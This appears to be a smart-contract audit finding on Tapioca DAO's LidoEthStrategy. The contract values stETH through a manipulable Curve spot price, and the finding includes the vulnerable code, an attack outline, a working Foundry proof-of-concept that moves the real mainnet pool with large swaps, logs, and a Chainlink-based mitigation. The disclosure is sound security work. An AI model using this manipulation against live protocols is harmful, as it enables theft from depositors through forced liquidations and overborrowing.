[H-08]LidoEthStrategy._currentBalanceis subject to price manipulation, allows overborrowing and liquidations
Submitted byGalloDaSballo, also found byladboy233,carrotsmuggler,kaden,cergyk, andrvierdiiev
The strategy is pricing stETH as ETH by asking the pool for itâ€™s return value
This is easily manipulatable by performing a swap big enough
https://github.com/Tapioca-DAO/tapioca-yieldbox-strategies-audit/blob/05ba7108a83c66dada98bc5bc75cf18004f2a49b/contracts/lido/LidoEthStrategy.sol#L118-L125
function_currentBalance()internalviewoverridereturns(uint256amount) {uint256stEthBalance=stEth.balanceOf(address(this));uint256calcEth=stEthBalance>0?curveStEthPool.get_dy(1,0,stEthBalance)// TODO: Prob manipulatable view-reentrancy:0;uint256queued=wrappedNative.balanceOf(address(this));returncalcEth+queued;}/// @dev deposits to Lido or queues tokens if the 'depositThreshold' has not been met yetfunction_deposited(uint256amount)internaloverridenonReentrant{uint256queued=wrappedNative.balanceOf(address(this));if(queued>depositThreshold) {require(!stEth.isStakingPaused(),"LidoStrategy: staking paused");INative(address(wrappedNative)).withdraw(queued);stEth.submit{value:queued}(address(0));//1:1 between eth<>stEth // TODO: Prob cheaper to buy stETHemitAmountDeposited(queued);return;}emitAmountQueued(amount);}
POC
Imbalance the Pool to overvalue the stETHOverborrow and Make the Singularity InsolventImbalance the Pool to undervalue the stETHLiquidate all Depositors (at optimal premium since attacker can control the price change)
Coded POC
Logs
[PASS] testSwapStEth() (gas:372360)Initial Price5443663537732571417920Changed Price2187071651284977907921Initial Price2187071651284977907921Changed Price1073148438886623970
[PASS] testSwapETH() (gas:300192)Logs:value100000000000000000000000Initial Price5443663537732571417920Changed Price9755041616702274912586value700000000000000000000000Initial Price9755041616702274912586Changed Price680711874102963551173181
Considering that swap fees are 1BPS, the attack is profitable at very low TVL
// SPDX-License Identifier: MITpragmasolidity^0.8.0;import"forge-std/Test.sol";import"forge-std/console2.sol";interfaceICurvePoolWeird{functionadd_liquidity(uint256[2]memoryamounts,uint256min_mint_amount)externalpayablereturns(uint256);functionremove_liquidity(uint256_amount,uint256[2]memory_min_amounts)externalreturns(uint256[2]memory);}interfaceICurvePool{functionadd_liquidity(uint256[2]memoryamounts,uint256min_mint_amount)externalpayablereturns(uint256);functionremove_liquidity(uint256_amount,uint256[2]memory_min_amounts)externalreturns(uint256[2]memory);functionget_virtual_price()externalviewreturns(uint256);functionremove_liquidity_one_coin(uint256_token_amount,int128i,uint256_min_amount)external;functionget_dy(int128i,int128j,uint256dx)externalviewreturns(uint256);functionexchange(int128i,int128j,uint256dx,uint256min_dy)externalpayablereturns(uint256);}interfaceIERC20{functionbalanceOf(address)externalviewreturns(uint256);functionapprove(address,uint256)externalreturns(bool);functiontransfer(address,uint256)externalreturns(bool);}contractSwapperisTest{ICurvePoolpool=ICurvePool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);IERC20stETH=IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);uint256TEN_MILLION_USD_AS_ETH=5455e18;// Rule of thumb is 1BPS cost means we can use 5 Billion ETH and still befunctionswapETH()externalpayable{console2.log("value",msg.value);console2.log("Initial Price",pool.get_dy(1,0,TEN_MILLION_USD_AS_ETH));pool.exchange{value:msg.value}(0,1,msg.value,0);// Swap all yolo// curveStEthPool.get_dy(1, 0, stEthBalance)console2.log("Changed Price",pool.get_dy(1,0,TEN_MILLION_USD_AS_ETH));}functionswapStEth()external{console2.log("Initial Price",pool.get_dy(1,0,TEN_MILLION_USD_AS_ETH));// Always approve exact ;)uint256amt=stETH.balanceOf(address(this));stETH.approve(address(pool),stETH.balanceOf(address(this)));pool.exchange(1,0,amt,0);// Swap all yolo// curveStEthPool.get_dy(1, 0, stEthBalance)console2.log("Changed Price",pool.get_dy(1,0,TEN_MILLION_USD_AS_ETH));}receive()externalpayable{}}contractCompoundedStakesFuzzisTest{Swapperc;IERC20token=IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);functionsetUp()public{c=newSwapper();}functiontestSwapETH()public{deal(address(this),100_000e18);c.swapETH{value:100_000e18}();/// 100k ETH is enough to double the pricedeal(address(this),700_000e18);c.swapETH{value:700_000e18}();/// 700k ETH is enough to double the price}functiontestSwapStEth()public{vm.prank(0x1982b2F5814301d4e9a8b0201555376e62F82428);// AAVE stETH // Has 700k ETH, 100k is sufficienttoken.transfer(address(c),100_000e18);c.swapStEth();vm.prank(0x1982b2F5814301d4e9a8b0201555376e62F82428);// AAVE stETH // Another one for good measuretoken.transfer(address(c),600_000e18);c.swapStEth();}}
Mitigation
Use the Chainlink stETH / ETH Price Feed or Ideally do not expose the strategy to any conversion, simply deposit and withdraw stETH directly to avoid any risk or attack in conversions
https://data.chain.link/arbitrum/mainnet/crypto-eth/steth-eth
https://data.chain.link/ethereum/mainnet/crypto-eth/steth-eth
0xRektora (Tapioca) confirmed via duplicate issue 828